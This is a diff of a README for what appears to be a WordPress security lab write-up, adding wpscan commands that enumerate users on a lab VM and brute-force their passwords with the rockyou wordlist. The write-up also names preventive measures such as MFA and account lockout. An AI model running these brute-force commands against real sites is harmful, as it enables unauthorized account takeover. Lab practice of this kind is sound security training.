@@ -15,7 +15,12 @@ Time spent: **X** hours spent in total
   - Techniques: BruteForce, Dictionary Attack, Credential Stuffing
   - Preventative Action: Password Complexity, Multi-Factor Authentication (MFA), Password Manager, Account Lockout Policy
   - Commands used:<br />
-  sudo gunzip /usr/share/wordlists/rockyou.txt.gz (extract and move for ease of use) <br /> wpscan --url http://wpdistillery.vm
+  sudo gunzip /usr/share/wordlists/rockyou.txt.gz (extract and move for ease of use)
+  <br /> wpscan --url http://wpdistillery.vm
+  <br /> wpscan --url http://wpdistillery.vm --enumerate u 
+  <br /> wpscan --url http://wpdistillery.vm -U ~/Desktop/wpusers.txt -P ~/Desktop/rockyou.txt
+
+
 - [ ] GIF Walkthrough:
 <img src="user_enum1.gif">
 <img src="BruteForce.gif">
